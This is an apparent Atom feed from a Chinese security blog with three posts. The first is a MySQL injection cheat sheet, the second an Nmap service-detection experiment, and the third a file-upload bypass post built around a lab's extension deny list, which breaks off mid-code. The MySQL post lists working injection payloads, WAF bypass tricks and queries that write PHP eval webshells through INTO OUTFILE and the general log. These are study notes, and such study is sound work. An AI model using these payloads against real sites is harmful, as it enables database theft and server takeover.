<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h00ls</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-23T15:22:38.575Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>h00ls</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mysql安全</title>
    <link href="http://example.com/2021/03/23/Mysql%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2021/03/23/Mysql%E5%AE%89%E5%85%A8/</id>
    <published>2021-03-23T12:37:08.000Z</published>
    <updated>2021-03-23T15:22:38.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mysql安全"><a href="#Mysql安全" class="headerlink" title="Mysql安全"></a>Mysql安全</h1><h2 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; or 1&#39;</span><br><span class="line">&#39; or 1 -- -</span><br><span class="line">&quot; or &quot;&quot; &#x3D; &quot;</span><br><span class="line">&quot; or 1&#x3D;1 -- -</span><br><span class="line">&#39; &#x3D; &#39;</span><br><span class="line">&#39;LIKE&#39;</span><br><span class="line">&#39;&#x3D;0 -- +</span><br></pre></td></tr></table></figure><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>要闭合语句，让<code>sql</code>语句正常才能执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">)</span><br><span class="line">))</span><br><span class="line">&#39;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;)</span><br><span class="line">&quot;))</span><br></pre></td></tr></table></figure><h3 id="常用内置函数"><a href="#常用内置函数" class="headerlink" title="常用内置函数"></a>常用内置函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">version()        当前数据库详细版本号</span><br><span class="line">database()       当前所在的数据库</span><br><span class="line">user()            当前数据库用户权限</span><br><span class="line">@@datadir         数据文件的存放目录</span><br><span class="line">@@basedir          数据库的安装路径</span><br><span class="line">@@version_compile_os        宿主系统平台是什么</span><br><span class="line">@@hostname                  当前机器的机器名</span><br><span class="line">show variables like &#39;log_%      查看日志文件存放位置</span><br></pre></td></tr></table></figure><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>页面显示不正常，会在页面出现</p><h4 id="基于错误注入"><a href="#基于错误注入" class="headerlink" title="基于错误注入"></a>基于错误注入</h4><p>会报错sql语句错误信息</p><p><strong>updatexml</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(&#39;~&#39;,version(),&#39;~&#39;),1)-- -</span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure><p>参数Xpath需要的是 xpath格式的字符串，不是就会报错，sql语句由内向外执行报错得到查询的信息</p><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，所以MySQL 5.1.5版本以下的不能上述函数进行报错注入。并且，上述报错注入函数有字符限制，最长32位</p><p><strong>exp</strong></p><p><code>MySql5.5.5</code>版本后整形溢出才会报错</p><p><strong>几何函数报错注入</strong></p><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()</p><h4 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h4><p>不会给出具体错误信息。sql语句正常是返回正常，异常时返回自定义的错误信息</p><p>正确情况</p><p><img src="/images/image-20210118100808835.png" alt="image-20210118100808835"></p><p>错误情况</p><p><img src="/images/image-20210118100736325.png" alt="image-20210118100736325"></p><p>布尔型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and substr(version(),1,1)&#x3D;5-- -</span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>不管输入的正确与否都会会显出正确的页面，也就是只会有相应时间的差别。</p><p><img src="/images/image-20210118100530058.png" alt="image-20210118100530058"></p><p>时间延迟注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; and if(substr(user(),2,1)&#x3D;&#39;o&#39;, sleep(1),sleep(5))-- -</span><br></pre></td></tr></table></figure><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><h5 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h5><p>Mysql在使用GBK编码的时候，会认为两个字节为一个汉字（当前一个ascii码大于128的时候，就是汉字了），而输入<code>%df%27</code>经过注释符就变成<code>%df%5c%27</code>，第一个字节大于128，所以<code>%df%5c</code>组合成一个汉字，就留下了<code>%27</code>，单引号就已经被带入数据库进行闭合了。把这个思路扩展到世界上所有多字节编码，只要低位的范围中含有<code>0x5c</code>的编码，就可以进行宽字符注入。</p><h5 id="宽字节注入实践"><a href="#宽字节注入实践" class="headerlink" title="宽字节注入实践"></a>宽字节注入实践</h5><p>TIPS：sqlmap无法直接注入，需要使用tamper <code>unmagicquotes.py</code>。或者在id后加上<code>%df&#39;</code> ，单引号需要根据情况修改闭合</p><p><img src="/images/image-20210123110631247.png" alt="image-20210123110631247"></p><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 %df 吃掉后面的 \   &#x3D;&#x3D;&#x3D;&gt;  payload: id&#x3D;1%df&#39; -- -</span><br></pre></td></tr></table></figure><p>POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 %df 先进行urldecode  ß  然后利用</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210123102918005.png" alt="image-20210123102918005"></p><h5 id="宽字节注入防范"><a href="#宽字节注入防范" class="headerlink" title="宽字节注入防范"></a>宽字节注入防范</h5><p>在查询语句前使用<code>mysql_query(SET character_set_client=binary)</code></p><h4 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h4><p>报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;updatexml(1,concat(&#39;~&#39;,version()),1)</span><br></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1,(select 1 from (select sleep(3))a)</span><br></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用;结束前面的sql语句，然后执行自己的新语句。</span><br></pre></td></tr></table></figure><h3 id="常见闭合"><a href="#常见闭合" class="headerlink" title="常见闭合"></a>常见闭合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">)</span><br><span class="line">&#39;)</span><br><span class="line">&quot;)</span><br><span class="line">&#39;))</span><br><span class="line">&quot;))</span><br></pre></td></tr></table></figure><h3 id="消息头注入"><a href="#消息头注入" class="headerlink" title="消息头注入"></a>消息头注入</h3><p><code>Referer</code> 和 <code>User-Agent</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;XOR(if(now()&#x3D;sysdate(),sleep(6*6-30),0))OR&#39;</span><br><span class="line"></span><br><span class="line">&#39;+(select*from(select(sleep(20)))a)+&#39;</span><br></pre></td></tr></table></figure><h2 id="PHP特殊函数"><a href="#PHP特殊函数" class="headerlink" title="PHP特殊函数"></a>PHP特殊函数</h2><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>在PHP4.0及以上的版本中，默认是开启的，本特性已自PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除，在PHP 5.4.O 起将始终返回 FALSE。</p><p>这个函数，只有在页面传递 <code>$_GET,$_POST,$_COOKIE</code> 时才会发生作用，如果输入的数据有单引号<code>&#39;</code>、<code>双引号&quot;</code>、<code>反斜线（/）</code>与 <code>NUL（NULL 字符）</code>等字符都会自动加上<code>反斜线</code>。</p><p><strong>绕过：</strong>针对数字型注入的不会使用单引号，因此可以绕过<code>addslashes()</code>函数。针对数字型注入，还需要<code>intval()</code>函数加强防御。</p><h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h4><p>转义sql语句中使用的字符串中的特殊字符：<code>\x00、\n、\r、\、&#39;、&quot;、\x1a</code></p><p><strong>但是，宽字节注入可以绕过</strong></p><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><p>返回在预定义字符之前添加反斜杠的字符串，预定义字符：’、”、\、NULL</p><p><strong>但是，宽字节注入可以绕过</strong></p><h2 id="Mysql写文件"><a href="#Mysql写文件" class="headerlink" title="Mysql写文件"></a>Mysql写文件</h2><p><strong>条件</strong></p><p>1、知道绝对路径</p><p>2、需要 <code>dba</code> 权限</p><p>3、目标文件夹有<code>写</code>的权限，一般选择<code>upload</code>、<code>images</code>等目录</p><p>4、未开启<code>GPC</code>。php5.2.29之后就没有<code>magic_quotes_gpc</code></p><p>5、必须要 <code>secure_file_priv</code>不为<code>NULL</code>，在<code>my.ini</code>中设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">所有目录都可写</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;</span><br><span class="line"></span><br><span class="line">只能写入指定目录</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;&quot;F:\\phpstudy_pro\\WWW\\sqli\\rain.php&quot;</span><br><span class="line"></span><br><span class="line">所有都不可写</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;NULL</span><br></pre></td></tr></table></figure><p>查询<code>secure_file_priv:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%secure_file_priv%&quot;;</span><br></pre></td></tr></table></figure><h5 id="利用union-select-写入"><a href="#利用union-select-写入" class="headerlink" title="利用union select 写入"></a>利用union select 写入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接写入文件</span><br><span class="line">id&#x3D;-1&#39; union select 1,&quot;&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;&quot;,3 into outfile &#39;E:\\eval.php&#39;-- -</span><br><span class="line"></span><br><span class="line"># 使用hex编码一句话绕过</span><br><span class="line">id&#x3D;-1&#39; union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile  &#39;E:\\eval.php&#39;-- -</span><br></pre></td></tr></table></figure><h5 id="terminated写入webshell"><a href="#terminated写入webshell" class="headerlink" title="terminated写入webshell"></a>terminated写入webshell</h5><p>我没尝试成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\2.php&#39; COLUMNS terminated by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\numm2.php&#39; fields terminated by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\numm.php&#39; lines starting by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; into outfile &#39;E:\\num.php&#39; lines terminated by &#39;&lt;?php phpinfo() ?&gt;&#39;--+</span><br></pre></td></tr></table></figure><h5 id="利用log写入"><a href="#利用log写入" class="headerlink" title="利用log写入"></a>利用log写入</h5><p>具体权限要求：数据库用户需具备<code>Super</code>和<code>File</code>服务器权限、获取物理路径。</p><p>查看配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%general%&quot;;</span><br></pre></td></tr></table></figure><p>开启日志功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br></pre></td></tr></table></figure><p>指定日志目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;F:\\Program_File\\phpstudy_pro\\WWW\\123.php&#39;</span><br></pre></td></tr></table></figure><p>写入webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); ?&gt;&quot;;</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><table><thead><tr><th>数据库</th><th>空格</th></tr></thead><tbody><tr><td>SQLite3</td><td>0A, 0D, 0C, 09, 20</td></tr><tr><td>Mysql 5</td><td>09, 0A, 0B, 0D, 0C, A0, 20</td></tr><tr><td>Oracle</td><td>00, 09, 0A, 0B, 0C, 0D, 20</td></tr><tr><td>MSSQL 2008</td><td>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20,25</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在php中\s会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20</span><br><span class="line">但是在mysql中空白字符为  0x09,0x0a,0x0b,0x0c,0x0d,0x20,0xa0 </span><br><span class="line"></span><br><span class="line">&#x2F;**&#x2F;  注释符号</span><br><span class="line"></span><br><span class="line">科学计数法(1e0)，数字计算(+、-、*、&#x2F;）、特殊字符（\N)，注释符(&#x2F;**&#x2F;)</span><br></pre></td></tr></table></figure><p><strong>无空格查询</strong></p><p>index.php?id=1e0and{``select(left(database(),1))=’a’}</p><h5 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">重写绕过</span><br><span class="line">aandnd</span><br><span class="line">oorr   </span><br><span class="line"></span><br><span class="line">使用特殊符号绕过</span><br><span class="line">%26%26    GET 请求</span><br><span class="line">&amp;&amp;        POST 请求</span><br><span class="line">||</span><br><span class="line">注释符 + %0a  绕过</span><br><span class="line"></span><br><span class="line">注释符绕过</span><br><span class="line">an&#x2F;**&#x2F;d    添加注释符</span><br><span class="line">an&#x2F;*!*&#x2F;d    内联注释</span><br></pre></td></tr></table></figure><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"></span><br><span class="line">-- -</span><br><span class="line"></span><br><span class="line">&#x2F;**&#x2F;    # 在其中添加一些垃圾数据，如：1&#39; union&#x2F;%%!asd%%%%&#x2F;select database(&#x2F;%%!fwji%%%%&#x2F;)</span><br><span class="line"></span><br><span class="line">;%00</span><br><span class="line"></span><br><span class="line">&#96;  # 只能用于在作为别名使用时结束查询</span><br></pre></td></tr></table></figure><h5 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h5><p>某些情况下可能只检测前面的<code>id</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1&amp;id&#x3D;1&#39; select version()</span><br></pre></td></tr></table></figure><p>还可以写成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;select 1&amp;id&#x3D;2,version() from dbname</span><br></pre></td></tr></table></figure><h5 id="多个POST请求包绕过"><a href="#多个POST请求包绕过" class="headerlink" title="多个POST请求包绕过"></a>多个POST请求包绕过</h5><h5 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a><strong>分块传输</strong></h5><p><img src="/images/image-20210319203004955.png" alt="image-20210319203004955"></p><h5 id="Burpsuite中的Change-body-encoding"><a href="#Burpsuite中的Change-body-encoding" class="headerlink" title="Burpsuite中的Change body encoding"></a><strong>Burpsuite中的Change body encoding</strong></h5><p>任意修改其中的boundary，但是下面的boundary必须有两个<code>--</code>结尾</p><p><img src="/images/image-20210319183842847.png" alt="image-20210319183842847"></p><p>还可以添加<code>filename</code>，但是需要注释才可以。</p><p><img src="/images/image-20210319191013437.png" alt="image-20210319191013437"></p><p><img src="/images/image-20210319191120045.png" alt="image-20210319191120045"></p><h5 id="结合分块传输和change-body-encoding"><a href="#结合分块传输和change-body-encoding" class="headerlink" title="结合分块传输和change body encoding"></a><strong>结合分块传输和change body encoding</strong></h5><p><img src="/images/image-20210319182938912.png" alt="image-20210319182938912"></p><h5 id="压缩协议绕过"><a href="#压缩协议绕过" class="headerlink" title="压缩协议绕过"></a><strong>压缩协议绕过</strong></h5><p>通过修改content-encoding对payload进行压缩从而实现绕过。</p><p><img src="/images/image-20210323211759439.png" alt="image-20210323211759439"></p><h5 id="畸形请求头"><a href="#畸形请求头" class="headerlink" title="畸形请求头"></a><strong>畸形请求头</strong></h5><p>只要保证<code>HTTP</code>和<code>1.1</code>之间的<code>/</code>存在，可以任意修改<code>HTTP</code>和<code>1.1</code></p><p><img src="/images/image-20210319183435268.png" alt="image-20210319183435268"></p><p>或者</p><p><img src="/images/image-20210319202515804.png" alt="image-20210319202515804"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mysql安全&quot;&gt;&lt;a href=&quot;#Mysql安全&quot; class=&quot;headerlink&quot; title=&quot;Mysql安全&quot;&gt;&lt;/a&gt;Mysql安全&lt;/h1&gt;&lt;h2 id=&quot;Mysql注入&quot;&gt;&lt;a href=&quot;#Mysql注入&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="Mysql" scheme="http://example.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Nmap服务探测</title>
    <link href="http://example.com/2021/03/23/Nmap%E6%89%AB%E6%8F%8F/"/>
    <id>http://example.com/2021/03/23/Nmap%E6%89%AB%E6%8F%8F/</id>
    <published>2021-03-23T12:37:08.000Z</published>
    <updated>2021-03-29T01:59:36.039Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Nmap服务探测"><a href="#Nmap服务探测" class="headerlink" title="Nmap服务探测"></a>Nmap服务探测</h3><p>遇到一个面试题，问nmap探测服务及版本的原理。然后做了个简单的实验，观察nmap扫描的流程，再配上一个大佬的流程图</p><a id="more"></a><h4 id="Nmap探测流程图"><a href="#Nmap探测流程图" class="headerlink" title="Nmap探测流程图"></a>Nmap探测流程图</h4><p><img src="https://img-blog.csdn.net/20150513170305634"></p><h4 id="端口存活探测"><a href="#端口存活探测" class="headerlink" title="端口存活探测"></a>端口存活探测</h4><p>使用下面命令实现对端口存活状态进行判断，并且还会返回服务类型（后面的SERVICE）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 127.0.0.1 -p3306</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210329091032789.png" alt="image-20210329091032789"></p><p>首先对比下两个包，在开启3306和未开启3306的端口情况。</p><p><img src="/images/image-20210329090553047.png" alt="image-20210329090553047"></p><p><img src="/images/image-20210329090629465.png" alt="image-20210329090629465"></p><p>第一幅图是未开启的端口抓取的包，第二个图是开启端口抓取的包。可以看到在服务开启的情况下，服务端会返回一个<code>RST</code>和<code>ACK</code>的包，因此可以通过返回包的值来判断端口是否开放。注意，这里并没有建立TCP连接，第三次握手直接由客户端中止，客户端发送了<code>RST</code>，会话结束。</p><p><strong>这里还发现一个有意思的事情</strong>，如果默认端口改了，那么nmap是探测不出来服务信息的。如下，我将mysql的服务端口改成5566，在<code>/etc/mysql/my.cnf</code>下</p><p><img src="/images/image-20210329091233455.png" alt="image-20210329091233455"></p><p>重启mysql，然后使用nmap探测服务。</p><p><img src="/images/image-20210329091335210.png" alt="image-20210329091335210"></p><p>直接探测不出来是什么服务，因此，在不加参数<code>sV</code>参数的情况下，它具有一个默认的对应关系，例如22就是ssh服务、80就是apache服务。遇到不认识的，那就不认识，不会详细探测。例如，我再将mysql端口改成3389，他就会认为这个是远程端口服务</p><p><img src="/images/image-20210329092424427.png" alt="image-20210329092424427"></p><p>如果需要对服务进一步的确认需要使用参数 -sV</p><h4 id="服务版本探测"><a href="#服务版本探测" class="headerlink" title="服务版本探测"></a>服务版本探测</h4><p>如上面所说，如果修改默认端口就探测不出来服务信息，有可能会误报。这个时候使用<code>-sV</code>进行探测。</p><p>这会儿将mysql监听再3306默认端口上看看怎么探测服务详细信息。抓到的包如下：</p><p><img src="/images/image-20210329093008881.png" alt="image-20210329093008881"></p><p>1-3行，表示探测端口是否开放，并没有建立连接，如果端口关闭那么整个流程结束，否则下一步探测。</p><p>4-6行，建立TCP连接的过程，进行三次握手</p><p>7行，是建立连接后，由该服务端口发送的一个<code>welcome banner</code>信息（其中包含服务的详细版本信息）</p><p>这里就是先通过Banner信息对服务版本进行判断，这种方式也可以通过<code>telnet</code>进行判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 127.0.0.1 3306</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210329093743746.png" alt="image-20210329093743746"></p><p>这时候修改默认端口会是什么情况？？？</p><p><img src="/images/image-20210329094123432.png" alt="image-20210329094123432"></p><p>可以看到这里变了，没有显示protocol是Mysql，这是wireshark不知道怎么去解析，然后看下这个数据里面的内容就和上面使用<code>telnet</code>一致了</p><p><img src="/images/image-20210329094556757.png" alt="image-20210329094556757"></p><p>从网上看到如果<code>nmap</code>不能通过<code>welcome banner</code>判断返回请求，就会发起大量的<code>nmap-service</code>去疯狂试探，然后对比自己的指纹数据库(<code>nmap-services-probe</code>)。做这个实验，我用msf随便监听了个端口，看看发包情况。</p><p><img src="/images/image-20210329095138392.png" alt="image-20210329095138392"></p><p>探测不到，就会返回信息，让用户自行定夺，他尽力了。</p><p><img src="/images/image-20210329095255346.png" alt="image-20210329095255346"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Nmap服务探测&quot;&gt;&lt;a href=&quot;#Nmap服务探测&quot; class=&quot;headerlink&quot; title=&quot;Nmap服务探测&quot;&gt;&lt;/a&gt;Nmap服务探测&lt;/h3&gt;&lt;p&gt;遇到一个面试题，问nmap探测服务及版本的原理。然后做了个简单的实验，观察nmap扫描的流程，再配上一个大佬的流程图&lt;/p&gt;</summary>
    
    
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>文件上传总结</title>
    <link href="http://example.com/2021/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-23T12:37:08.000Z</published>
    <updated>2021-03-23T12:38:30.404Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="Upload-Labs"><a href="#Upload-Labs" class="headerlink" title="Upload-Labs"></a>Upload-Labs</h2><p>主要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span 